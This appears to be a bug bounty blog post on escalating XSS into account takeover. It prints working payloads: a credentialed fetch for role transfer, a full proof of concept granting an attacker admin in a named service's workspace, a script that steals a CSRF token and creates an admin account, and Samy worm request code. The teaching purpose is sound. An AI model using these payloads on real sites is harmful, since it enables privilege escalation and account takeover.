# Real World XSS Escalation & Impact

- **Source URL:** https://medium.com/@viodex02/real-world-xss-escalation-impact-1c5f5e17240e
- **Fetched from:** https://medium.com/@viodex02/real-world-xss-escalation-impact-1c5f5e17240e?source=rss-e71541002b13------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14925)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Viodex / Sat, 26 Sep 2026 18:34:44 GMT

Real World XSS Escalation & Impact

When I was learning XSS for the first time, I started wondering about its real-world impact.

While reading HackerOne reports and Medium articles, I noticed a pattern: many researchers seemed to stop at the same point — demonstrating a simple payload such as:

A popup appears containing the number 1, and suddenly: “Congratulations, we found XSS.”

But I kept asking myself:

**What does this actually mean for a real victim?**

A victim isn’t going to look at a popup and think, “Oh no, someone made my browser display the number 1.”

Some researchers take the next step and try:

\<script>alert(document.cookie)\</script>

If the session cookie appears in the popup, that’s certainly interesting. Depending on how the application’s authentication works, it could lead to account compromise.

But what happens when document.cookie doesn’t reveal anything?

Do we simply go back to:

and call it a day?

I don’t think that’s the right way to think about XSS.

alert(1) isn’t the impact of XSS. It’s merely evidence that JavaScript execution is possible.

The interesting question is not:

“Can I make JavaScript execute?”

It’s:

“What can that JavaScript actually do within the application’s security context?”

that’s where the things are getting intersting.

XSS can range from an informational finding to a critical security vulnerability. The severity depends on several factors, including:

The first point to grasp is what kind of access the injected JavaScript has and what it can interact with.

An **XSS** takes place within the security context of the application which is vulnerable.

**Hence**, the extent of its potential impact is largely determined by the privileges, data, and features available to the affected user.

For instance, An **XSS** attack carried out in the browser of an administrator could have a great deal more impact than the same vulnerability when it is carried out in the account of a standard user. It is just as important to understand how the application handles authentication. For example, session cookies can be protected by means of attributes such as **HttpOnly**, thereby preventing JavaScript from being able to access them directly through **document**. **cookie**. However, this does not mean that the XSS is without danger since JavaScript could still interact with the features available to the authenticated browser.

The important question is therefore not simply:

“Can I read the session cookie?”

but rather:

“What can JavaScript do from this security context?”

The type of application can provide useful clues about where the real impact may be.

Different applications expose different security-sensitive functionality, so the same XSS vulnerability can have very different consequences depending on where it exists.

For example:

The goal isn’t to assume that XSS automatically leads to privilege escalation or account takeover. Instead, the application’s architecture should guide your investigation into what security boundaries the XSS might cross.

Once XSS has been confirmed, don’t stop at alert(1).

The next step is to understand the application’s functionality and determine what actions are available within the affected security context.

For example, an application might contain functionality such as:

These functions can make the difference between a simple JavaScript execution bug and a vulnerability with significant security impact.

Therefore, when evaluating XSS, the important question is not:

“Can I execute JavaScript?”

That has already been answered by the **XSS** itself.

The more important question is:

“What security-sensitive actions can this JavaScript perform within the application’s context?”

For this example, we will consider the following factors:

**NOTE:** This is just an example, not a real-world example or a real finding. A real-world example will be discussed later.

After noticing the XSS vulnerability by entering the following normal payload:

and then entering your account through preview mode and noticing the pop-up, most people stop here, report it, and just forget about it.

It is still a vulnerability, but it has a relatively low impact.

So, how can we increase the impact?

If you are a little familiar with JavaScript, you may first check whether the session cookie is flagged as HttpOnly, which determines whether JavaScript can directly read the cookie or not.

Most of the time, it will be flagged as HttpOnly. But what if it isn't?

If it isn’t, an attacker could potentially inject JavaScript that attempts to send the user’s cookies to an external server controlled by the attacker.

Here the attacker escalate normal XSS (low) to 1 click Account TakeOver (high — critical)

But as we said, in the modern web, it is really hard to find these easy-hanging fruits. So, this is the time for you, as an attacker, to go a step further.

From the information you previously learned, you may start thinking:

What if I could trigger JavaScript that causes the victim’s browser to make a request that uses the victim’s existing session and transfers the manager role to my account?

Before we dig deeper, we need to understand the difference between **Reading** and **Including**.

Reading cookies means directly trying to access them through JavaScript using document.cookie, for example:

\<script>console.log(document.cookie)\</script>

Here, JavaScript can only access cookies that are not flagged as HttpOnly. The browser exposes those cookies through document.cookie, and the script can then print them to the console.

**Including is different from reading.**

When including cookies, JavaScript does not need to access the cookie value. Instead, you can cause the browser to make a request to a website, and the browser may automatically attach the cookies associated with that website to the request.

In other words:

**Reading:** JavaScript asks the browser, “Give me the cookie value.”

**Including:** JavaScript tells the browser, “Make this request and send user’s cookies with it,” and the browser handles the appropriate cookies automatically.

This distinction is important because HttpOnly prevents JavaScript from reading a cookie, but it does not necessarily prevent the browser from sending that cookie with a request to the appropriate website.

In a real-world scenario, an attacker might host the JavaScript on their own server and then reference it through a \<script src> tag.

The malicious script hosted on the attacker’s server could look like this:

`<script> fetch("https://redacted.com/transfer-role", { // 1 method: "POST", // 2 credentials: "include", // 3 body: "user=attacker_account" // 4 }); </script>`
The attacker could then save this code in a file such as hack.js and reference it from the biography section:

This approach can also help bypass input-length limitations, since the biography only needs to contain a short reference to the external JavaScript file rather than the entire script.

`fetch("https://redacted.com/transfer-role", {`
This specifies the endpoint that the browser is being asked to send the request to. In this example, the endpoint represents a role-transfer functionality.

method: "POST",

This tells fetch() to make the request using the POST method.

credentials: "include",

This tells the browser to include credentials such as cookies with the request when permitted by the browser’s security policies.

The important point here is that JavaScript does not need to read the cookie value using document.cookie. The browser handles the cookie itself.

body: "user=attacker\_account"

This represents the data being submitted to the endpoint. In this example, it specifies the account that the role would be transferred to.

So, conceptually, the flow is:

**Stored XSS → Victim previews profile → JavaScript executes → Browser makes the POST request → Browser handles the victim’s existing credentials → Server processes the request**

The key concept is that the attacker does not necessarily need to steal the victim’s cookie. Instead, the attacker abuses the victim’s already-authenticated manager session.

Because the request is made from the manager’s browser session, it is sent with the manager’s valid credentials. The server therefore sees the request as coming from an authenticated manager who is authorized to perform the role-transfer action.

In other words, the attacker is not becoming the manager. They are tricking the manager’s already-authenticated browser into performing an action that the manager is legitimately allowed to perform.

This is what makes the impact significantly higher: the application trusts the authenticated session, and the request itself is valid from the server’s perspective.

The example above was only meant to give an idea of how far an XSS vulnerability can go.

It is not only about showing pop-up messages or proving that JavaScript can execute. When exploited in the right context, XSS can be used to perform security-sensitive actions and lead to more critical vulnerabilities.

Hackers can often increase the impact of an XSS vulnerability by identifying security-sensitive actions that can be performed within the victim’s session.

A well-known historical example is the **MySpace Samy Worm**, which demonstrated how XSS could be used to propagate from one user to another when users visited a page containing the malicious content.

This illustrates an important point: XSS is not limited to executing JavaScript in a victim’s browser. Its real impact depends on what the application allows that JavaScript to access or influence within the user’s security context.

Because XSS escalation isn’t some written way, but it depends on your critical thinking skills, I will give you some **Real World examples** just to open your mind to be able to think in a more critical way when hunting for your next XSS.

This example came up earlier in one of my articles on file upload vulnerabilities. Here we’ll look at the same report, but this time the focus is purely on the XSS side rather than the file upload vulnerability itself.

you can read it from [here](https://medium.com/@viodex02/real-world-file-upload-vulnerabilities-from-file-upload-to-rce-9d6452e61a84?ref=hackernoon.com)

Hunter: sjalu 

Target: Dust

Severity: High -- 8.7

Weakness: File Upload Vulnerability → Stored XSS

Platform: https://hackerone.com/reports/3115705

Bounty: None

While testing Dust’s file upload functionality, sjalu discovered that the application allowed HTML files to be uploaded and rendered directly in the browser.

That behavior led to **Stored XSS**.

The important part wasn’t simply that an HTML file could be uploaded. The real problem was that the uploaded file was served from **Dust’s own origin**, meaning JavaScript inside that file could execute in the security context of Dust.

A simple payload was enough to confirm the issue:

After uploading the file and opening its generated URL, the alert(1) appeared.

At this point, the XSS was confirmed.

But this is where the interesting part starts.

alert(1) only proves that JavaScript execution is possible. It doesn't tell us what the vulnerability can actually do.

So instead of stopping there, sjalu looked at Dust’s functionality and started asking a more important question:

**What can JavaScript do if it executes as an authenticated Dust user?**

The next step was understanding how Dust’s frontend communicates with its backend.

By observing the network requests generated while performing different actions, it was possible to see that important operations were performed through authenticated API requests.

These included functionality related to:

This is where the XSS became much more interesting.

The attacker already had JavaScript execution.

Now there was a way for that JavaScript to interact with the application’s authenticated functionality.

The important idea here is that the attacker doesn’t necessarily need to steal the victim’s session cookie.

The victim is already logged in.

If the XSS executes in the victim’s browser, the browser can make requests using that existing authenticated session, subject to the application’s and browser’s security controls.

The following PoC demonstrates how the XSS could interact with Dust’s API:

\<html>

\<head>

\<title>PoC - Dust Workspace Takeover\</title>

\<style>

body {

font-family: Arial, sans-serif;

margin: 40px;

background-color: #f8f9fa;

}

.container {

background: white;

padding: 20px;

border-radius: 8px;

box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);

}

h1 {

color: #333;

}

p {

color: #555;

}

\</style>

\</head>

\<body>

\<div class="container">

\<h1>Proof of Concept - Dust Workspace Admin Takeover\</h1>

\<p>

When this page is visited by an admin inside a workspace,

he'll give the attacker's user ID admin privileges.

The attacker can then manually de-rank the former admin

to a regular member.

\</p>

\</div>

\<script>

const attackerUserId = '\<dummy\_id>';

fetch('https://dust.tt/api/user', {

method: 'GET',

headers: {

'accept': '\*/\*',

'x-commit-hash': '41c0391',

},

credentials: 'include'

})

.then(res => res.json())

.then(userData => {

if (

userData.user &&

userData.user.workspaces &&

userData.user.workspaces.length > 0

) {

const workspaceId =

userData.user.workspaces\[0\].sId;

const victimUserId = userData.user.id;

fetch(

\`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}\`,

{

method: 'POST',

headers: {

'content-type': 'application/json',

'accept': '\*/\*',

'x-commit-hash': '41c0391',

},

credentials: 'include',

body: JSON.stringify({

role: "admin"

})

}

);

alert(

\`PWNED\n\nVictim Username: ${userData.user.username}\nVictim Email: ${userData.user.email}\`

);

}

});

\</script>

\</body>

\</html>Let’s break down what is happening here.

The first request is:

`fetch('https://dust.tt/api/user', { method: 'GET', ... credentials: 'include' })`
The purpose of this request is to retrieve information about the currently authenticated user.

The interesting part is:

credentials: 'include'

The JavaScript isn’t trying to read the victim’s cookie and extract its value.

Instead, the browser handles the existing authentication when making the request, according to the applicable cookie and browser security rules.

The response is then converted into JSON:

.then(res => res.json())

The script can then access information returned by the application.

From the response, the script extracts the workspace identifier:

const workspaceId = userData.user.workspaces\[0\].sId;

This is important because the next API request needs to know which workspace the action applies to.

The script is basically using the victim’s authenticated context to discover the relevant workspace.

The most important part of the PoC is the second fetch() request:

``fetch( `https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`, { method: 'POST', ... credentials: 'include', body: JSON.stringify({ role: "admin" }) } );``
This request targets the API responsible for modifying a workspace member.

The body contains:

So instead of using the XSS to simply display something on the screen, the JavaScript is interacting with a **security-sensitive application function**.

*That’s the important escalation.*

This is probably the most important concept in the entire example.

A common way of thinking about XSS is:

“If I can read *document.cookie, I can steal the session."*

That can be true in some situations, but it isn’t the only way XSS can have serious impact.

In this case, the payload doesn’t need to know the actual value of the victim’s session cookie.

The victim’s browser already has an authenticated session.

The malicious JavaScript simply executes inside that browser and attempts to interact with the application’s functionality using that session.

So the attacker isn’t necessarily **becoming the administrator**.

Instead, the attacker is abusing the administrator’s already-authenticated browser to perform an action that the administrator is authorized to perform.

That distinction is extremely important when thinking about XSS impact.

Hunter: A Bug'z Life

Target: Private Program

Severity: High → Critical

Weakness: Stored XSS

Platform: Medium

Bounty: None

While hunting on a private Bug Bounty program on HackerOne, a researcher came across an XSS vulnerability in an OAuth system. When one of the other parameters, such as state or scope, was invalid, the application displayed a button containing the redirect\_uri value.

https://redacted.com/Oauth/?redirect\_uri=https://attacker.com&scope=foo&state=state123

If one of the other parameters was invalid, the website took the redirect\_uri value and placed it inside a link, like this:

The problem seemed to involve two main points:

Because of these two issues, the attacker was able to inject a malicious redirect\_uri containing the following:

javascript:alert(1)

At this point, the researcher had a valid **Reflected XSS** vulnerability. When the victim clicked the anchor link, the injected JavaScript would execute.

However, the researcher noticed an important point.

The vulnerable function was hosted on the same main domain as another function that could potentially be abused to create an administrator account. This meant that the researcher could investigate whether the XSS could be escalated beyond a simple proof of concept by interacting with functionality on the same origin.

Before submitting the report, the researcher tried to escalate the impact by following these steps:

***Technical Note:*** *To verify whether both endpoints share the same origin, compare their* ***scheme, hostname, and port****. If all three match, they are same-origin. This can be checked by inspecting their URLs or requests in Burp Suite.*

The researcher then investigated whether JavaScript executing in the vulnerable application’s origin could interact with the administrative account-creation workflow using the authenticated user’s session.

After discovering the administrative function, the researcher first tried to locate where the CSRF\_TOKEN was reflected. Such tokens are commonly stored in a hidden input in an HTML page or exposed through an API endpoint such as /api/csrf\_token.

In this case, the researcher found that the token was stored in a meta tag on the same endpoint used to create an administrator account:

The researcher then investigated whether JavaScript executing under the vulnerable origin could access the administrative page and read the CSRF token from the HTML response.

The following example illustrates how a same-origin request could retrieve an HTML document and locate a token in a meta tag:

var url = "/user/new";

var xhr = new XMLHttpRequest();

xhr.responseType = "document";

xhr.open("GET", url, true);

xhr.onload = function (e) {

if (

xhr.readyState === XMLHttpRequest.DONE &&

xhr.status === 200

) {

page = xhr.response;

// Get the CSRF token from the meta tag

token = page

.getElementsByName("csrf-token")\[0\]

.getAttribute("content");

// Show the token

console.log("The token is: " + token);

}

};

xhr.send(null);

This code will be explained later in this section, but for now, there is one important point to understand:

*Using XMLHttpRequest for a request to the same origin allows the browser to apply the relevant authentication and browser security rules automatically. Whether cookies are sent depends on the request context and the cookie attributes. Reading the response also requires the request to be permitted by the browser and the application.*

After confirming that the token could be accessed in the relevant context, the researcher continued investigating whether the administrative workflow could be abused through the XSS.

The following code represents the structure of the final proof of concept used to test the account-creation workflow:

`var url = "/user/new"; function submitFormWithToken(token) { var xhr = new XMLHttpRequest(); xhr.open("POST", url, true); var formData = new FormData(); formData.append("authenticity_token", token); formData.append("login", "neemaPoC"); formData.append("firstname", "Neema"); formData.append("lastname", "PoC"); formData.append("email", "xss_demo@gmail.com"); // role_id = 2 is the administrator role formData.append("role_ids[]", 2); formData.append("new_status", "active"); xhr.send(formData); } var xhr = new XMLHttpRequest(); xhr.responseType = "document"; xhr.open("GET", url, true); xhr.onload = function (e) { if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) { page = xhr.response; // Get the CSRF token from the meta tag token = page .getElementsByName("csrf-token")[0] .getAttribute("content"); // Show the token console.log("The token is: " + token); // Use the token to submit the form submitFormWithToken(token); } }; // Make the request xhr.send(null);`
In summary, the intended flow of this proof of concept was to retrieve the CSRF token from the administrative page and then submit a request to the account-creation endpoint using the authenticated session.

If the application accepted the request and assigned the requested administrative privileges without additional authorization checks, the impact could extend beyond reflected JavaScript execution.

The account-creation workflow also sent an email to the newly created account’s address. The researcher investigated whether this process could lead to the creation and subsequent activation of an administrator account.

Here , the researcher didn’t report it directly , instead he thought , roped every single line together , giving him a higher impact (Mostly **critical**) than reporting a non-impactful XSS

*Samy found this vulnerability in 2005, long before bug bounty schemes, coordinated vulnerability disclosure, and authorized penetration testing campaigns became common practices. It is not advisable to try and reproduce it on actual websites or accounts.*

In 2005 a hacker by the name of **Samy** came across an XSS vulnerability in MySpace which resulted in one of the most famous cases of a self-replicating web worm.

A vulnerability was present in a profile field which permitted users to include a limited quantity of HTML and CSS. Although MySpace filtered JavaScript in an effort to stop script execution, the filtering was not complete.

The vulnerability was called a worm since it could copy its contents across the affected profiles and pass from one user to another in a way similar to a conventional computer worm spreading between systems.

When Samy was looking into MySpace he found that some of the profile fields allowed restricted HTML and CSS but tried to block JavaScript; standard methods, such as the use of \<script> tags or event handlers, were filtered and did not work.

Then he looked into the possibility of introducing JavaScript via CSS.

At that time, certain older browsers-most notably Internet Explorer-had unusual features concerning CSS URL values. For instance, it was possible to use CSS to load a background image:

Even though this may seem harmless, the way older browsers behaved meant that certain URL-based situations would treat the javascript: **pseudo-protocol** as executable JavaScript.

`javascript:alert('test')`
In older browser environments, a construct such as the following could execute JavaScript:

***Important:*** *This behaviour is out of date and usually fails in modern browsers since it relied on the behaviour of older browsers and therefore should not be regarded as a reliable method for XSS in modern times.*

At that stage the only problem was an XSS vulnerability; Samy’s more important insight was that the faulty profile feature and the actions involved in adding friends and updating profile information were available on the same origin.

Since the requests were issued from the victim’s authenticated browser environment, the browser was able to automatically include the victim’s session details in requests made to the **same origin**. As a result, JavaScript running in the victim’s profile could in principle carry out actions on the victim’s behalf, provided that the application’s implementation and security measures allowed it.

The worm was designed around two main actions:

The initial exploit was not just a simple alert() popup message. What made it so significant was the fact that it combined cross-site scripting with authenticated, state-changing features.

This example merely illustrates the two actions involved; it does not send requests, alter profiles, add friends, or replicate itself:

\<script>

Javascript = '\[THE-SAME-WORM-CONTENT\]';

var ajax = new XMLHttpRequest();

ajax.open(

"GET",

"/friend.php?id=abc123\_sonson)",

true

);

ajax.send();

ajax.open(

"GET",

\`/update.php?words=${javascript})\`,

true

);

ajax.send();

\</script>

The key point is that the effect of XSS depends on the kinds of actions the vulnerable origin permits the browser to carry out. If an application exposes sensitive actions which change the state without having in place adequate protections, then an XSS vulnerability can be exploited for more than just displaying a popup. In the past MySpace instance, the combination of profile injection, authenticated requests, and automatic replication turned the vulnerability into a worm that spread rapidly.

*After that, Samy’s house was surrounded by police because the worm had spread to over 1 million accounts like a sneaky worm. It only needed a real person to view the profile to let the worm into the website. This caused MySpace to shut down its website temporarily to recover the affected accounts before the worm could spread further.*

*Although Samy was a great researcher and ethical hacker,* ***never copy what he did. It is still illegal.***

XSS can hold such a treasure beneath the surface. It can lead to more critical vulnerabilities if you focus on the things we talked about. If you find XSS, don’t report it immediately. First, determine how far you can take it. Do any sensitive functions exist on the same origin? Try to explore its full impact within the authorized scope so you don’t miss any high-impact consequences.

**Work legal and Stay safe , My friend :)**

**Note:** This article was originally published on HackerNoon. However, since it has been under review by their team for over a month, I decided to publish it on Medium for now. Once the review is completed, I’ll add the HackerNoon link here as well.

written by : viodex (founder and leader for perdo team)

version : v1.0

published by : viodex

re-published by : perdo team

*Originally published at https://hackernoon.com.*
